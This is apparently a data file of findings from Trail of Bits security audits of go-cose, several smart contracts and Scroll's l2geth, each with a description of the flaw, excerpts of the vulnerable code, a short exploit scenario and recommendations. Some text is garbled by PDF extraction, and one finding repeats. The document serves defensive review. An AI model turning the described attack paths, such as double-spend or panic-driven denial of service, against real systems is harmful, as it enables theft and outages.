unprotected header, allowing an adversary to manipulate the meaning of the message by adding, removing, or changing the set of critical headers. Recommendations Add a check during ensureCritical to verify that the crit label is not present in the unprotected header bucket. Fix Analysis This issue has been resolved. Pull request #81, committed to the main branch in 62383c287782d0ba5a6f82f984da0b841e434298, adds validations to ensure that the crit label is not present in unprotected headers. 16 Microsoft go-cose Security Assessment (DRAFT)", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "3. Generic COSE header types are not validated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-microsoft-go-cose-securityreview.pdf", "body": "Section 3.1 of RFC 8152 denes a number of common COSE header parameters and their associated value types. Applications using the go-cose library may rely on COSE-dened headers decoded by the library to be of a specied type. For example, the COSE specication denes the content-type header (label #3) as one of two types: a text string or an unsigned integer. The go-cose library validates only the alg and crit parameters, not content-type. See Figure 3.1 for a list of dened header types. Figure 3.1: RFC 8152 Section 3.1, Table 2 Further header types are dened by the IANA COSE Header Parameter Registry. 17 Microsoft go-cose Security Assessment (DRAFT) Exploit Scenario An application uses go-cose to verify and validate incoming COSE messages. The application uses the content-type header to index a map, expecting the content type to be a valid string or integer. An attacker could, however, supply an unhashable value, causing the application to panic. Recommendations Short term, explicitly document which IANA-dened headers or label ranges are and are not validated. Long term, validate commonly used headers for type and semantic consistency. For example, once counter signatures are implemented, the counter-signature (label #7) header should be validated for well-formedness during unmarshalling. 18 Microsoft go-cose Security Assessment (DRAFT)", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Lack of zero-value checks in setter functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-ailayerlabs-6079smartcontracts-securityreview.pdf", "body": "Certain functions fail to validate incoming arguments, so callers of these functions could mistakenly set important state variables to a zero value, misconguring the system. For example, the Distribution_init function in the Distribution contract sets the depositToken , l1Sender , and splitter variables to the addresses passed as arguments without checking whether any of the values are the zero address. This may result in undened behavior in the system. function Distribution_init ( address depositToken_ , address l1Sender_ , address splitter_ , FeeData calldata feeData_, Pool calldata pool_ ) external initializer { __Ownable_init(); __UUPSUpgradeable_init(); depositToken = depositToken_; l1Sender = l1Sender_; splitter = splitter_; ... } Figure 1.1: The Distribution_init function ( Distribution contract, L3854 ) In addition to the above, the following setter functions also lack zero-value checks:  Distribution  editPool  L1Sender  setRewardTokenConfig  L2MessageReceiver  setParams  RewardClaimer  RewardClaimer__init  setSplitter  setL1Sender Exploit Scenario Alice deploys a new version of the Distribution contract. When she invokes Distribution_init to set the contracts parameters, she mistakenly enters a zero value, thereby misconguring the system. Recommendations Short term, add zero-value checks to all function arguments to ensure that callers cannot set incorrect values and miscongure the system. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. Lack of event generation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-ailayerlabs-6079smartcontracts-securityreview.pdf", "body": "Multiple user operations do not emit events. As a result, it will be dicult to review the contracts behavior for correctness once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. The following operations should trigger events:  Splitter  Splitter__init  updatePool  updateGroupShares  removeUpgradeability  L1Sender  L1Sender__init  setRewardTokenConfig  setDepositTokenConfig  updateAllowedAddresses  sendDepositToken  sendMintMessage  Distribution  removeUpgradeability  L2MessageReceiver  setParams  L2TokenReceiver  editParams  withdrawToken  withdrawTokenId  RewardClaimer  RewardClaimer__init  setSplitter  setL1Sender  Token  updateMinter Exploit Scenario An attacker discovers a vulnerability in any of these contracts and modies its execution. Because these actions generate no events, the behavior goes unnoticed until there is follow-on damage, such as nancial loss. Recommendations Short term, add events for all operations that could contribute to a higher level of monitoring and alerting. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "3. Risk of token loss due to lack of zero-value check of destination address ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-ailayerlabs-6079smartcontracts-securityreview.pdf", "body": "We identied two functions that fail to verify whether the destination address is the zero address before sending tokens. This can lead to the unintentional burning of tokens. First, as shown in gure 3.1, the claim function in the Distribution contract takes a receiver address, which is user-provided, and subsequently uses it to send native tokens via the sendMintMessage function in the L1Sender contract. Consequently, if the user mistakenly provides the zero address as the receiver argument, the tokens will inadvertently be burnt. function claim ( address receiver_ ) external payable { address user_ = _msgSender(); UserData storage userData = usersData[user_]; ... // Transfer rewards IL1Sender(l1Sender).sendMintMessage{value: msg.value }(receiver_, pendingRewards_, user_); emit UserClaimed(user_, receiver_, pendingRewards_); } Figure 3.1: The claim function ( Distribution contract, L184209 ) Second, the claim function in the RewardClaimer contract does not verify whether the receiver_ argument is the zero address; tokens will also be burned if a user supplies the zero address for this argument. Exploit Scenario Alice invokes the claim function in the Distribution contract to claim reward tokens. However, by mistake she supplies the zero address as the receiver address. Consequently, the claimed rewards are transmitted to the zero address, causing the tokens to be irreversibly lost. Recommendations Short term, add zero-address checks to the function arguments to ensure that callers cannot set incorrect values that result in the loss of tokens. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. The _setupRole function is deprecated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf", "body": "The L1Teleporter contract inherits the Openzeppelins AccessControl contract. In the constructor function, the contract uses the _setupRole function to give the DEFAULT_ADMIN_ROLE to the _admin address and PAUSER_ROLE to the _pauser address (gure 1.1). However, the _setupRole function is deprecated in favor of the _grantRole function (gure 1.2). constructor(address _l2ForwarderFactory, address _l2ForwarderImplementation, address _admin, address _pauser) L2ForwarderPredictor(_l2ForwarderFactory, _l2ForwarderImplementation) { } _setupRole(DEFAULT_ADMIN_ROLE, _admin); _setupRole(PAUSER_ROLE, _pauser); Figure 1.1: The constructor function (L1Teleporter.sol#L24-L29) * NOTE: This function is deprecated in favor of {_grantRole}. */ function _setupRole(bytes32 role, address account) internal virtual { _grantRole(role, account); } Figure 1.2: The _setupRole function (AccessControl.sol#L204-L208) Recommendations Short term, use the _grantRole function instead of the _setupRole function. Long term, when using third-party libraries, make sure to accurately review the documentation and follow recommendations when using the libraries.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. Vacuous unit tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf", "body": "The tests for the fee logic of the L1Teleporter contract are tautological and assert that the calculation of the function being tested is equivalent to the same calculation. While this may increase code coverage, it does not specify what is correct, but rather denes the implementation as correct. Concrete values should be used instead of reperforming the calculation. assertEq( standardEth, standardCosts.l1l2TokenBridgeCost + standardCosts.l2ForwarderFactoryCost + standardCosts.l2l3TokenBridgeCost, \"standardEth\" ); // we only check RetryableGasCosts once because it'll be the same for all modes assertEq( standardCosts.l1l2FeeTokenBridgeCost, gasParams.l1l2FeeTokenBridgeGasLimit * gasParams.l2GasPriceBid + gasParams.l1l2FeeTokenBridgeMaxSubmissionCost, \"l1l2FeeTokenBridgeCost\" ); assertEq( standardCosts.l1l2TokenBridgeCost, gasParams.l1l2TokenBridgeGasLimit * gasParams.l2GasPriceBid + gasParams.l1l2TokenBridgeMaxSubmissionCost, \"l1l2TokenBridgeCost\" ); assertEq( standardCosts.l2ForwarderFactoryCost, gasParams.l2ForwarderFactoryGasLimit * gasParams.l2GasPriceBid + gasParams.l2ForwarderFactoryMaxSubmissionCost, \"l2ForwarderFactoryCost\" ); assertEq( standardCosts.l2l3TokenBridgeCost, gasParams.l2l3TokenBridgeGasLimit * gasParams.l3GasPriceBid + gasParams.l2l3TokenBridgeMaxSubmissionCost, \"l2l3TokenBridgeCost\" ); } Figure 2.1: Test reimplementing contracts calculation (l1-l3-teleport-contracts/test/Teleporter.t.sol#201231) Recommendations Short term, add unit tests that explicitly specify expected values, and perform integration testing against a devnet deployment of Arbitrum Nitro. Long term, create and implement testing plans as part of the design and development of new features.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "3. Suggested refactorings to make precedence explicit and simplify code ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf", "body": "In the L1Teleporter and L2Forwarder contracts, some calculations chain arithmetic operations and rely on the implicit precedence of the operators instead of making the desired precedence syntactically explicit with parentheses (gures 3.1 and 3.2). In addition, some calculations are redundant, and the values can be reused to clarify that the values are expected to be equivalent (gures 3.2 and 3.3). Below are alternative implementations that are more explicit. diff --git a/contracts/L1Teleporter.sol b/contracts/L1Teleporter.sol index 52d440f..f27e9f9 100644 --- a/contracts/L1Teleporter.sol +++ b/contracts/L1Teleporter.sol @@ -219,13 +219,13 @@ contract L1Teleporter is Pausable, AccessControl, L2ForwarderPredictor, IL1Telep returns (RetryableGasCosts memory results) { results.l1l2FeeTokenBridgeCost = gasParams.l1l2FeeTokenBridgeMaxSubmissionCost - + + gasParams.l1l2FeeTokenBridgeGasLimit * gasParams.l2GasPriceBid; + (gasParams.l1l2FeeTokenBridgeGasLimit * gasParams.l2GasPriceBid); results.l1l2TokenBridgeCost = gasParams.l1l2TokenBridgeMaxSubmissionCost + - gasParams.l1l2TokenBridgeGasLimit * gasParams.l2GasPriceBid; + (gasParams.l1l2TokenBridgeGasLimit * gasParams.l2GasPriceBid); gasParams.l1l2TokenBridgeMaxSubmissionCost + results.l2ForwarderFactoryCost = gasParams.l2ForwarderFactoryMaxSubmissionCost - + + gasParams.l2ForwarderFactoryGasLimit * gasParams.l2GasPriceBid; + (gasParams.l2ForwarderFactoryGasLimit * gasParams.l2GasPriceBid); results.l2l3TokenBridgeCost = gasParams.l2l3TokenBridgeMaxSubmissionCost + - gasParams.l2l3TokenBridgeGasLimit * gasParams.l3GasPriceBid; + (gasParams.l2l3TokenBridgeGasLimit * gasParams.l3GasPriceBid); gasParams.l2l3TokenBridgeMaxSubmissionCost + } Figure 3.1: Suggested change to make desired precedence explicit (l1-l3-teleport-contracts/contracts/L1Teleporter.sol#220-229) diff --git a/contracts/L2Forwarder.sol b/contracts/L2Forwarder.sol index b250e51..d617efa 100644 --- a/contracts/L2Forwarder.sol +++ b/contracts/L2Forwarder.sol @@ -96,7 +96,8 @@ contract L2Forwarder is IL2Forwarder { // create retryable ticket uint256 maxSubmissionCost = uint256 callValue = tokenBalance - maxSubmissionCost - params.gasLimit * IERC20Inbox(params.routerOrInbox).calculateRetryableSubmissionFee(0, 0); - params.gasPriceBid; + params.gasPriceBid); + uint256 totalFeeAmount = maxSubmissionCost + (params.gasLimit * uint256 callValue = tokenBalance - totalFeeAmount; IERC20Inbox(params.routerOrInbox).createRetryableTicket({ to: params.to, l2CallValue: callValue, @@ -109,7 +110,7 @@ contract L2Forwarder is IL2Forwarder { data: \"\" }); emit BridgedToL3(callValue, maxSubmissionCost + params.gasLimit * - params.gasPriceBid); + emit BridgedToL3(callValue, totalFeeAmount); } Figure 3.2: Suggested change to perform fee calculation once (l1-l3-teleport-contracts/contracts/L2Forwarder.sol#99112) diff --git a/contracts/L1Teleporter.sol b/contracts/L1Teleporter.sol index 52d440f..df545a8 100644 --- a/contracts/L1Teleporter.sol +++ b/contracts/L1Teleporter.sol @@ -133,14 +133,14 @@ contract L1Teleporter is Pausable, AccessControl, L2ForwarderPredictor, IL1Telep teleportationType = toTeleportationType({token: params.l1Token, feeToken: params.l3FeeTokenL1Addr}); + ethAmount = costs.l1l2TokenBridgeCost + costs.l2ForwarderFactoryCost; if (teleportationType == TeleportationType.Standard) { ethAmount = costs.l1l2TokenBridgeCost + costs.l2ForwarderFactoryCost + - costs.l2l3TokenBridgeCost; + ethAmount += costs.l2l3TokenBridgeCost; feeTokenAmount = 0; } else if (teleportationType == TeleportationType.OnlyCustomFee) { - ethAmount = costs.l1l2TokenBridgeCost + costs.l2ForwarderFactoryCost; feeTokenAmount = costs.l2l3TokenBridgeCost; } else { ethAmount = costs.l1l2TokenBridgeCost + costs.l1l2FeeTokenBridgeCost + - costs.l2ForwarderFactoryCost; + ethAmount += costs.l1l2FeeTokenBridgeCost; feeTokenAmount = costs.l2l3TokenBridgeCost; } } Figure 3.3: Suggested change to emphasize base fee amount for all types (l1-l3-teleport-contracts/contracts/L1Teleporter.sol#136147) Recommendations Short term, apply the refactorings suggested above. Long term, prefer explicit precedence and reuse values where they are expected to be identical rather than recomputing them.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Undocumented struct elds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf", "body": "The elds of the structures, RetryableGasParams and RetryableGasCosts, are undocumented, and it would be helpful to specify how and where these values are to be used for reviewers and developers, especially considering how similar they are. struct RetryableGasParams { uint256 l2GasPriceBid; uint256 l3GasPriceBid; uint64 l2ForwarderFactoryGasLimit; uint64 l1l2FeeTokenBridgeGasLimit; uint64 l1l2TokenBridgeGasLimit; uint64 l2l3TokenBridgeGasLimit; uint256 l2ForwarderFactoryMaxSubmissionCost; uint256 l1l2FeeTokenBridgeMaxSubmissionCost; uint256 l1l2TokenBridgeMaxSubmissionCost; uint256 l2l3TokenBridgeMaxSubmissionCost; } /// @notice Total cost for each retryable ticket. struct RetryableGasCosts { uint256 l1l2FeeTokenBridgeCost; uint256 l1l2TokenBridgeCost; uint256 l2ForwarderFactoryCost; uint256 l2l3TokenBridgeCost; } Figure 4.1: Structs with undocumented elds (l1-l3-teleport-contracts/contracts/interfaces/IL1Teleporter.sol#3251) Recommendations Short term, document the structures elds. Long term, require documentation as part of pull requests.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. Teleport function should document that contract callers should be able to create retryable tickets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf", "body": "The L1Teleporters documentation of its teleport function does not mention that callers of teleport may need to create retryable tickets to call rescueFunds on the L2Forwarder should teleporting to L3 fail. If a contract is immutable and does not have the capability to create retryable tickets, the senders funds may be irrecoverable. If called by an EOA or a contract's constructor, the L2Forwarder will be Call `determineTypeAndFees` to calculate the total cost of retryables in /// @notice Start an L1 -> L3 transfer. msg.value sent must equal the total ETH cost of all retryables. /// ETH and the L3's fee token. /// owned by the caller's address, /// /// @dev L2Forwarder, and one to call the L2ForwarderFactory. /// be created to send the L3's fee token to the L2Forwarder. /// l2CallValue of the call to the L2ForwarderFactory. function teleport(TeleportParams calldata params) external payable; otherwise the L2Forwarder will be owned by the caller's alias. 2 retryables will be created: one to send tokens and ETH to the If TeleportationType is NonFeeTokenToCustomFeeL3, a third retryable will ETH used to pay for the L2 -> L3 retryable is sent through the Figure 5.1: Natspec of the teleport function (l1-l3-teleport-contracts/contracts/interfaces/IL1Teleporter.sol#7683) Recommendations Short term, document that contracts using the teleporter should include functionality to create retryables in case they need to call rescueFunds on the L2. Long term, review and implement user-facing documentation and SDKs for validations and recommendations to make integration less error-prone. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. Multiple instances of unchecked errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "There are multiple instances of unchecked errors in the l2geth codebase, which could lead to undened behavior when errors are raised. One such unhandled error is shown in gure 2.1. A comprehensive list of unchecked errors is provided in appendix C. if len(requests) == 0 && req.deps == 0 { s.commit(req) } else { Figure 2.1: The Sync.commit() function returns an error that is unhandled, which could lead to invalid commitments or a frozen chain. (go-ethereum/trie/sync.go#296298) Unchecked errors also make the system vulnerable to denial-of-service attacks; they could allow attackers to trigger nil dereference panics in the sequencer node. Exploit Scenario An attacker identies a way to cause a zkTrie commitment to fail, allowing invalid data to be silently committed by the sequencer. Recommendations Short term, add error checks to all functions that can emit Go errors. Long term, add the tools errcheck and ineffassign to l2geths build pipeline. These tools can be used to detect errors and prevent builds containing unchecked errors from being deployed.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Risk of double-spend attacks due to use of single-node Clique consensus without nality API ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geth uses the proof-of-authority Clique consensus protocol, dened by EIP-255. This consensus type is not designed for single-node networks, and an attacker-controlled sequencer node may produce multiple conicting forks of the chain to facilitate double-spend attacks. The severity of this nding is compounded by the fact that there is no API for an end user to determine whether their transaction has been nalized by L1, forcing L2 users to use ineective block/time delays to determine nality. Clique consensus was originally designed as a replacement for proof-of-work consensus for Ethereum testnets. It uses the same fork choice rule as Ethereums proof-of-work consensus; the fork with the highest diculty should be considered the canonical fork. Clique consensus does not use proof-of-work and cannot update block diculty using the traditional calculation; instead, block diculty may be one of two values:  1 if the block was mined by the designated signer for the block height  2 if the block was mined by a non-designated signer for the block height This means that in a network with only one authorized signer, all of the blocks and forks produced by the sequencer will have the same diculty value, making it impossible for syncing nodes to determine which fork is canonical at the given block height. In a normal proof-of-work network, one of the proposed blocks will have a higher diculty value, causing syncing nodes to re-organize and drop the block with the lower diculty value. In a single-validator proof-of-authority network, neither block will be preferred, so each syncing node will simply prefer the rst block they received. This nding is not unique to l2geth; it will be endemic to all L2 systems that have only one authorized sequencer. Exploit Scenario An attacker acquires control over l2geths centralized sequencer node. The attacker modies the node to prove two forks: one fork containing a deposit transaction to a centralized exchange, and one fork with no such deposit transaction. The attacker publishes the rst fork, and the centralized exchange picks up and processes the deposit transaction. The attacker continues to produce blocks on the second private fork. Once the exchange processes the deposit, the attacker stops generating blocks on the public fork, generates an extra block to make the private fork longer than the public fork, then publishes the private fork to cause a re-organization across syncing nodes. This attack must be completed before the sequencer is required to publish a proof to L1. Recommendations Short term, add API methods and documentation to ensure that bridges and centralized exchanges query only for transactions that have been proved and nalized on the L1 network. Long term, decentralize the sequencer in such a way that a majority of sequencers must collude in order to successfully execute a double-spend attack. This design should be accompanied by a slashing mechanism to penalize sequencers that sign conicting blocks.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Improper use of panic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geth overuses Gos panic mechanism in lieu of Gos built-in error propagation system, introducing opportunities for denial of service. Go has two primary methods through which errors can be reported or propagated up the call stack: the panic method and Go errors. The use of panic is not recommended, as it is unrecoverable: when an operation panics, the Go program is terminated and must be restarted. The use of panic creates a denial-of-service vector that is especially applicable to a centralized sequencer, as a restart of the sequencer would eectively halt the L2 network until the sequencer recovers. Some example uses of panic are presented in gures 4.1 to 4.3. These do not represent an exhaustive list of panic statements in the codebase, and the Scroll team should investigate each use of panic in its modied code to verify whether it truly represents an unrecoverable error. func sanityCheckByte32Key(b []byte) { if len(b) != 32 && len(b) != 20 { panic(fmt.Errorf(\"do not support length except for 120bit and 256bit now. data: %v len: %v\", b, len(b))) } } Figure 4.1: The sanityCheckByte32Key function panics when a trie key does not match the expected size. This function may be called during the execution of certain RPC requests. (go-ethereum/trie/zk_trie.go#4448) func (s *StateAccount) MarshalFields() ([]zkt.Byte32, uint32) { fields := make([]zkt.Byte32, 5) if s.Balance == nil { panic(\"StateAccount balance nil\") } if !utils.CheckBigIntInField(s.Balance) { panic(\"StateAccount balance overflow\") } if !utils.CheckBigIntInField(s.Root.Big()) { panic(\"StateAccount root overflow\") } if !utils.CheckBigIntInField(new(big.Int).SetBytes(s.PoseidonCodeHash)) { panic(\"StateAccount poseidonCodeHash overflow\") } Figure 4.2: The MarshalFields function panics when attempting to marshal an object that does not match certain requirements. This function may be called during the execution of certain RPC requests. (go-ethereum/core/types/state_account_marshalling.go#4764) func (t *ProofTracer) MarkDeletion(key []byte) { if path, existed := t.emptyTermPaths[string(key)]; existed { // copy empty node terminated path for final scanning t.rawPaths[string(key)] = path } else if path, existed = t.rawPaths[string(key)]; existed { // sanity check leafNode := path[len(path)-1] if leafNode.Type != zktrie.NodeTypeLeaf { panic(\"all path recorded in proofTrace should be ended with leafNode\") } Figure 4.3: The MarkDeletion function panics when the proof tracer contains a path that does not terminate in a leaf node. This function may be called when a syncing node attempts to process an invalid, malicious proof that an attacker has gossiped on the network. (go-ethereum/trie/zktrie_deletionproof.go#120130) Exploit Scenario An attacker identies an error path that terminates with a panic that can be triggered by a malformed RPC request or proof payload. The attacker leverages this issue to either disrupt the sequencers operation or prevent follower/syncing nodes from operating properly. Recommendations Short term, review all uses of panic that have been introduced by Scrolls changes to go-ethereum. Ensure that these uses of panic truly represent unrecoverable errors, and if not, add error handling logic to recover from the errors. Long term, annotate all valid uses of panic with explanations for why the errors are unrecoverable and, if applicable, how to prevent the unrecoverable conditions from being triggered. l2geths code review process must also be updated to verify that this documentation exists for new uses of panic that are introduced later.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "5. Risk of panic from nil dereference due to awed error reporting in addressToKey ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "The addressToKey function, shown in gure 5.1, returns a nil pointer instead of a Go error when an error is returned by the preImage.Hash() function, which will cause a nil dereference panic in the NewZkTrieProofWriter function, as shown in gure 5.2. If the error generated by preImage.Hash() is unrecoverable, the addressToKey function should panic instead of silently returning a nil pointer. func addressToKey(addr common.Address) *zkt.Hash { var preImage zkt.Byte32 copy(preImage[:], addr.Bytes()) h, err := preImage.Hash() if err != nil { log.Error(\"hash failure\", \"preImage\", hexutil.Encode(preImage[:])) return nil } return zkt.NewHashFromBigInt(h) } Figure 5.1: The addressToKey function returns a nil pointer to zkt.Hash when an error is returned by preImage.Hash(). (go-ethereum/trie/zkproof/writer.go#3141) func NewZkTrieProofWriter(storage *types.StorageTrace) (*zktrieProofWriter, error) { underlayerDb := memorydb.New() zkDb := trie.NewZktrieDatabase(underlayerDb) accounts := make(map[common.Address]*types.StateAccount) // resuming proof bytes to underlayerDb for addrs, proof := range storage.Proofs { if n := resumeProofs(proof, underlayerDb); n != nil { addr := common.HexToAddress(addrs) if n.Type == zktrie.NodeTypeEmpty { accounts[addr] = nil } else if acc, err := types.UnmarshalStateAccount(n.Data()); err == nil { if bytes.Equal(n.NodeKey[:], addressToKey(addr)[:]) { accounts[addr] = acc Figure 5.2: The addressToKey function is consumed by NewZkTrieProofWriter, which will attempt to dereference the nil pointer and generate a system panic. (go-ethereum/trie/zkproof/writer.go#152167) Recommendations Short term, modify addressToKey so that it either returns an error that its calling functions can propagate or, if the error is unrecoverable, panics instead of returning a nil pointer. Long term, update Scrolls code review and style guidelines to reect that errors must be propagated by Gos error system or must halt the program by using panic.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "6. Risk of transaction pool admission denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geths changes to the transaction pool include an ECDSA recovery operation at the beginning of the pools transaction validation logic, introducing a denial-of-service vector: an attacker could generate invalid transactions to exhaust the sequencers resources. l2geth adds an L1 fee that all L2 transactions must pay. To verify that an L2 transaction can aord the L1 fee, the transaction pool calls fees.VerifyFee(), as shown in gure 6.1. VerifyFee() performs an ECDSA recovery operation to determine the account that will pay the L1 fee, as shown in gure 6.2. ECDSA key recovery is an expensive operation that should be executed as late in the transaction validation process as possible in order to reduce the impact of denial-of-service attacks. func (pool *TxPool) add(tx *types.Transaction, local bool) (replaced bool, err error) { // If the transaction is already known, discard it hash := tx.Hash() if pool.all.Get(hash) != nil { log.Trace(\"Discarding already known transaction\", \"hash\", hash) knownTxMeter.Mark(1) return false, ErrAlreadyKnown } // Make the local flag. If it's from local source or it's from the network but // the sender is marked as local previously, treat it as the local transaction. isLocal := local || pool.locals.containsTx(tx) if pool.chainconfig.Scroll.FeeVaultEnabled() { if err := fees.VerifyFee(pool.signer, tx, pool.currentState); err != nil { Figure 6.1: TxPool.add() calls fees.VerifyFee() before any other transaction validators are called. (go-ethereum/core/tx_pool.go#684697) func VerifyFee(signer types.Signer, tx *types.Transaction, state StateDB) error { from, err := types.Sender(signer, tx) if err != nil { return errors.New(\"invalid transaction: invalid sender\") } Figure 6.2: VerifyFee() initiates an ECDSA recovery operation via types.Sender(). (go-ethereum/rollup/fees/rollup_fee.go#198202) Exploit Scenario An attacker generates a denial-of-service attack against the sequencer by submitting extraordinarily large transactions. Because ECDSA recovery is a CPU-intensive operation and is executed before the transaction size is checked, the attacker is able to exhaust the memory resources of the sequencer. Recommendations Short term, modify the code to check for L1 fees in the TxPool.validateTx() function immediately after that function calls types.Sender(). This will ensure that other, less expensive-to-check validations are performed before the ECDSA signature is recovered. Long term, exercise caution when making changes to code paths that validate information received from public sources or gossip. For changes to the transaction pool, a good general rule of thumb is to validate transaction criteria in the following order: 1. Simple, in-memory criteria that do not require disk reads or data manipulation 2. Criteria that require simple, in-memory manipulations of the data such as checks of the transaction size 3. Criteria that require an in-memory state trie to be checked 4. ECDSA recovery operations 5. Criteria that require an on-disk state trie to be checked However, note that sometimes these criteria must be checked out of order; for example, the ECDSA recovery operation to identify the origin account may need to be performed before the state trie is checked to determine whether the account can aord the transaction.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "1. Transaction pool fails to drop transactions that cannot a\u0000ord L1 fees ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geth denes two fees that must be paid for L2 transactions: an L2 fee and an L1 fee. However, the code fails to account for L1 fees; as a result, transactions that cannot aord the combined L1 and L2 fees may be included in a block rather than demoted, as intended. The transaction.go le denes a Cost() function that returns the amount of ether that a transaction consumes, as shown in gure 1.1. The current implementation of Cost() does not account for L1 fees, causing other parts of the codebase to misjudge the balance requirements to execute a transaction. The correct implementation of Cost() should match the implementation of VerifyFee(), which correctly checks for L1 fees. // Cost returns gas * gasPrice + value. func (tx *Transaction) Cost() *big.Int { total := new(big.Int).Mul(tx.GasPrice(), new(big.Int).SetUint64(tx.Gas())) total.Add(total, tx.Value()) return total } Figure 1.1: The Cost() function does not include L1 fees in its calculation. (go-ethereum/core/types/transaction.go#318323) Most notably, Cost() is consumed by the tx_list.Filter() function, which is used to prune un-executable transactions (transactions that cannot aord the fees), as shown in gure 1.2. The failure to account for L1 fees in Cost() could cause tx_list.Filter() to fail to demote such transactions, causing them to be incorrectly included in the block. func (l *txList) Filter(costLimit *big.Int, gasLimit uint64) (types.Transactions, types.Transactions) { // If all transactions are below the threshold, short circuit if l.costcap.Cmp(costLimit) <= 0 && l.gascap <= gasLimit { return nil, nil } l.costcap = new(big.Int).Set(costLimit) // Lower the caps to the thresholds l.gascap = gasLimit // Filter out all the transactions above the account's funds removed := l.txs.Filter(func(tx *types.Transaction) bool { return tx.Gas() > gasLimit || tx.Cost().Cmp(costLimit) > 0 }) Figure 1.2: Filter() uses Cost() to determine which transactions to demote. (go-ethereum/core/tx_list.go#332343) Exploit Scenario A user creates an L2 transaction that can just barely aord the L1 and L2 fees in the next upcoming block. Their transaction is delayed due to full blocks and is included in a future block in which the L1 fees have risen. Their transaction reverts due to the increased L1 fees instead of being ejected from the transaction pool. Recommendations Short term, refactor the Cost() function to account for L1 fees, as is done in the VerifyFee() function; alternatively, have the transaction list structure use VerifyFee() or a similar function instead of Cost(). Long term, add additional tests to verify complex state transitions such as a transaction becoming un-executable due to changes in L1 fees.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "6. Risk of transaction pool admission denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geths changes to the transaction pool include an ECDSA recovery operation at the beginning of the pools transaction validation logic, introducing a denial-of-service vector: an attacker could generate invalid transactions to exhaust the sequencers resources. l2geth adds an L1 fee that all L2 transactions must pay. To verify that an L2 transaction can aord the L1 fee, the transaction pool calls fees.VerifyFee(), as shown in gure 6.1. VerifyFee() performs an ECDSA recovery operation to determine the account that will pay the L1 fee, as shown in gure 6.2. ECDSA key recovery is an expensive operation that should be executed as late in the transaction validation process as possible in order to reduce the impact of denial-of-service attacks. func (pool *TxPool) add(tx *types.Transaction, local bool) (replaced bool, err error) { // If the transaction is already known, discard it hash := tx.Hash() if pool.all.Get(hash) != nil { log.Trace(\"Discarding already known transaction\", \"hash\", hash) knownTxMeter.Mark(1) return false, ErrAlreadyKnown } // Make the local flag. If it's from local source or it's from the network but // the sender is marked as local previously, treat it as the local transaction. isLocal := local || pool.locals.containsTx(tx) if pool.chainconfig.Scroll.FeeVaultEnabled() { if err := fees.VerifyFee(pool.signer, tx, pool.currentState); err != nil { Figure 6.1: TxPool.add() calls fees.VerifyFee() before any other transaction validators are called. (go-ethereum/core/tx_pool.go#684697) func VerifyFee(signer types.Signer, tx *types.Transaction, state StateDB) error { from, err := types.Sender(signer, tx) if err != nil { return errors.New(\"invalid transaction: invalid sender\") } Figure 6.2: VerifyFee() initiates an ECDSA recovery operation via 